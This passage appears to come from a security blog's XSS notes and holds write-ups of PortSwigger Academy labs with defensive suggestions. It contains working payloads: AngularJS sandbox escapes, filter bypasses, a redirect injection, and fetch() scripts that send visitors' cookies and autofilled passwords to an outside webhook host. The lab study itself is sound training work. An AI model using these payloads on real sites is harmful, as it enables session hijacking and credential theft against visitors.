  **Note:** Refer to [AngularJS DOM XSS Attack](https://www.youtube.com/watch?v=QpQp2JLn6JA) for more details walkthrough

  <details markdown="1">
  <summary>Click me to expand the process</summary>

  1. After did some researches ([AngularJS - Escaping the Expression Sandbox](https://spring.io/blog/2016/01/28/angularjs-escaping-the-expression-sandbox-for-xss), [Function() constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function), [Object.prototype.constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor), ) I come up with a couple of different payloads to pybass the security filter.
     ~~~
     Payload-1: \{\{$eval.constructor(prompt('AngularJS_xss'))()\}\}
     Payload-2: \{\{$on.constructor('prompt("AngularJS_xss")')()\}\}
     ~~~
  
  </details>
  -

</details>

## 3. Store-Based XSS
Payload is stored in the database, and victim’s browser will retrieve it once it visit the page. For instance:  
1. In the attacker’s browser leave html injection comment: \<h1\>test\</h1\>.
2. Visit the same page from victim’s browser

![store_xxs.png](/assets/img/githubpost/xxs_1.png)

### Labs (Store-Based XSS)
Just for demostration, I completed some labs on [PortSwigger Academy](https://portswigger.net/web-security/all-labs#cross-site-scripting) to show how this vulnerability can lead to:

<details markdown="1">
  <summary>Click me to expand the labs</summary>  

  _**1. Stored XSS into anchor href attribute with double quotes HTML-encoded**_  
  This instance contains a stored XSS vulnerability in the comment section. I submit a comment that triggers an alert when the author’s name is clicked.
  
  <details markdown="1">
  <summary>Click me to expand the process</summary>
  
  1. In the comment section, there are four fields (Comment, Name, Email, Website). After filling out all the fields and submitting my comment, I notice that the Name section contains an external link, which is the website I enter while filling out the form.

  2. I use the search function in the inspection tab to look for the website I enter. And I find:
     ~~~
     Result: <a id="author" href="Website.com">Name</a>
     ~~~

  3. Now, I determine that the href attribute accepts user input, so I enter a simple payload into the Website field. It is confirmed that the alert will be triggered when I click on the Name.
     ~~~
     Website: javascript:alert('Zebra!')
     Result: <a id="author" href="javascript:alert('Zebra!')">World Smartest Zebra</a>
     ~~~
   
  </details>
  -

  _**2. Stored DOM XSS**_  
  In this instance, the comment rendering is vulnerable to stored DOM‑based XSS because `escape()` only replaces the first `<`, `>` so I bypass it which leaves later tags unescaped, allowing arbitrary script execution when the page inserts comments into the DOM.

  <details markdown="1">
  <summary>Click me to expand the process</summary>

  1. Firstly, I look into the script used in the web application under the Network tab on the Inspection page. And I find there is an escape function using [replace()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace)
     ```javascript
     function escapeHTML(html) {
         return html.replace('<', '&lt;').replace('>', '&gt;');
     }
     ```

     {: .box-note}
     **Note:** A string pattern will only be replaced once. To perform a global search and replace, use a regex with the g flag, or use replaceAll() instead.

  2. Now that I know only the first set of angle brackets is escaped and anything after that isn't, I craft my payload as:
     ~~~
     Payload: <><img src="x" onerror="prompt('I am escaped!')">
     Rendered:
     <p>
       &lt;&gt;
       <img src="x" onerror="prompt('I am escaped!')">
     </p>
     ~~~

  3. A prompt pops up with a message after I submit (store) the payload in the comment section, which indicates the filter mechanism (`replace()` function) was bypassed and the application is still vulnerable to XSS.

  _**Suggestion**_
  1. Make the escaping correct (use [global replacements or replaceAll/regex](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#description))
  2. Deploy [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) that disallows inline handlers, and protect cookies (HttpOnly/SameSite) to reduce impact.

  </details>
  -

  _**3. Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**_  
  In this instance, I discover a Stored XSS vulnerability in the comment feature, specifically within the onclick event handler of anchor (`<a>`) elements. User input (from the “Website” field) is embedded directly into the JavaScript code inside an HTML attribute without applying proper context-specific encoding or sanitization. I was able to bypass the escaping and trigger the prompt by encoding my payload as an HTML entity.
  
  <details markdown="1">
  <summary>Click me to expand the process</summary>

  1. In the comment section, there are four fields (Comment, Name, Email, Website). After filling out all the fields and submitting my comment, I notice that the Name section contains an external link, which is the website I enter while filling out the form.

  2. I look into the inspection tab and pull out the syntax
     ```javascript
     <a id="author" href="Website"
     onclick="var tracker={track(){}};tracker.track('Website');">User_Name</a>
     ```
     
  3. I try to break out of the single quote in the `onclick` event, so when the user clicks an external link on the website, it will trigger the `onclick` event.
     But I notice that my single quote is escaped (`\'`), so the prompt isn't executed.
     ```javascript
     <a id="author" href="http://Website.com\'); prompt();//)"
     onclick="var tracker={track(){}};tracker.track('http://Website.com\'); prompt();//');">User_Name</a>
     ```
     {: .box-note}
     **Note:** The user input is used inside the `tracker.track()` call, enclosed in single quotes. So I close the first statement (`');`), insert the testing payload, then close the second statement (`prompt();`). Lastly, I use double forward slashes (`//`) to comment out the rest of the syntax.
     
  4. I use an additional backslash to neutralize the backslash that's meant to escape the single quote (`\'`), but it is also escaped (`\\\'`).

  5. To bypass this, I use [Cyberchef](https://cyberchef.io/#recipe=To_HTML_Entity(false,'Named%20entities')&input=Jyk7cHJvbXB0KCk7Ly8) to HTML-encode my payload. 
     ~~~
     Plain-text: ');prompt();//
     HTML-Entity: &apos;&rpar;&semi;prompt&lpar;&rpar;&semi;&sol;&sol;
     ~~~

  6. After submitting the website with the encoded payload appended, I successfully bypassed the filter. I can trigger the prompt by clicking the website’s external link, which proves the stored XSS vulnerability.
     ```javascript
     <a id="author" href="http://Website.com\'); prompt();//"
     onclick="var tracker={track(){}};tracker.track('http://Website.com\'); prompt();//');">tes</a>
     ```

  _**Suggestion**_
  1. Use JS and HTML attribute [context-aware output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) before rendering untrusted data inside event handlers or inline scripts. Avoid embedding untrusted user input directly into inline JavaScript.
  2. [validate inputs](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#implementing-input-validation) (e.g., quotes, backslashes, and parentheses) in the “Website” field.
  3. Avoid writing event handlers directly inline in the HTML (e.g., `<button onclick="doSomething()">`), [separate the structure (HTML) from behavior (JavaScript)](https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Scripting/Events#using_addeventlistener).
  4. Apply a [CSP header](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#defense-against-xss) that blocks inline scripts and restricts script execution to trusted sources only.

  </details>
  -

  _**4. Store XSS in comment section to steal cookies**_  
  The web application contains a Stored XSS vulnerability in its comment section, I retrieve other users' cookie session by storing the persist JavaScript that executes in the browsers of other users who view the infected post.
  
  <details markdown="1">
  <summary>Click me to expand the process</summary>

  1. To start with, I leave a prompt function in the comment section of a post on the web application for testing the XSS vulnerability. After I refresh the page, a window pop up to prove it is vulnerable to XSS.

  2. To simulate a more realistic scenario, I leave JavaScript that causes other users' browsers to automatically post their session cookies to my controlled domain ([Webhook](https://webhook.site/)).
     ```javascript
     <script>
     fetch('https[://]webhook[.]site', {
       method: 'POST',
       mode: 'no-cors',
       body: document.cookie
     });
     </script>
     ```

  3. After retrieving the cookie, I can use it to impersonate the cookie owner for further exploitation.

  _**Suggestion**_
  1. Use a proven HTML sanitizer (e.g. [DOMPurify](https://www.npmjs.com/package/dompurify)) to safely handle rich-text or HTML input.
  2. [Escape characters](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) appropriately for the output context (HTML, JavaScript, or attributes).
  3. Set session cookies with the [HttpOnly](https://owasp.org/www-community/HttpOnly) and Secure flags to prevent access via JavaScript and enforce HTTPS usage
  4. Apply a [CSP header](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#defense-against-xss) that blocks inline scripts and restrict script sources.
  5. [validate inputs](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#implementing-input-validation) (e.g., quotes, backslashes, and parentheses) in all user input fields.

  </details>
  -

  _**5. Exploiting cross-site scripting to capture passwords**_  
  The web application is vulnerable to a stored XSS in the post comment section. This vulnerability allows an attacker to inject JavaScript function into user comments. When other users view the compromised comment, it executes in their browsers and automatically exfiltrating saved credentials from browser password managers by using a `fetch()` call to send the data to external domain.
  
  <details markdown="1">
  <summary>Click me to expand the process</summary>

  1. To start with, I leave a prompt function in the comment section of a post on the web application for testing the XSS vulnerability. After I refresh the page, a window pop up to prove it is vulnerable to XSS.

  2. To simulate a more realistic scenario. In the comment field of the post, I create two HTML input fields that cause users' password managers to automatically fill the saved username and password and forward them to my controlled domain. ([Webhook](https://webhook.site/)).
     ```javascript
     <input name=username id=username>
     <input type=password name=password onchange="if(this.value.length)fetch('https[://]webhook[.]site',{
       method: 'POST',
       mode: 'no-cors',
       body:username.value+':'+this.value
     });">
     ```

  3. After retrieving the users' credentials, I can use it to impersonate the cookie owner for further exploitation.

  _**Suggestion**_
  1. Use a proven HTML sanitizer (e.g. [DOMPurify](https://www.npmjs.com/package/dompurify)) to safely handle rich-text or HTML input.
  2. [Escape characters](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) appropriately for the output context (HTML, JavaScript, or attributes).
  3. Apply a [CSP header](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#defense-against-xss) that blocks inline scripts and restrict script sources.
  4. [validate inputs](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#implementing-input-validation) (e.g., quotes, backslashes, and parentheses) in all user input fields.
  5. On client-side, disable [autofill in sensitive contexts](https://cybernews.com/security/password-managers-autofill-credentials-for-attackers/).

  </details>
  -



</details>

### Page Redirect
User could inject the following code into a vulnerable website, causing an automatic redirect to a malicious site. When a victim loads the page with this injected script, they will be automatically redirected to <$url>.
   ~~~
   src=x onerror="window.location.href='<$url>'"
   ~~~

### HTML Events
<details markdown="1">
<summary>Click me to reveal the chart of HTML events</summary>

| Event | Trigger Condition | Elements | Notes |
| :------ | :------ | :------ | :------ |
| onmouseover | When mouse pointer moves over an element | Most HTML elements including input | Used for hover interaction |
| onmouseout | When mouse pointer leaves an element | Most HTML elements including input | |
| onmousedown | When mouse button pressed over an element | Most elements | |
| onmouseup | When mouse button released over an element | Most elements | |
| onclick | When user clicks on an element | Most elements | Commonly used event |
| onfocus | When element receives focus (tab, click, or programmatic) | Input, textarea, select | Particularly useful for inputs |
| onblur | When element loses focus | Input, textarea, select | |
| onchange | When element's value is changed and the control loses focus | Input, select, textarea | Fires after commit of the change |
| oninput | When the user modifies the value | Input, textarea | Fires immediately as value changes |
| onerror | When loading of resource fails | img, script, iframe, media tags | Does not fire on input elements |
| onload | When resource loads successfully | body, img, iframe, script, media | Does not fire on input elements |
| onsubmit | When form is submitted | form element | |
| onkeydown | When a key is pressed | Most elements | |
| onkeyup | When a key is released | Most elements | |
  
</details>
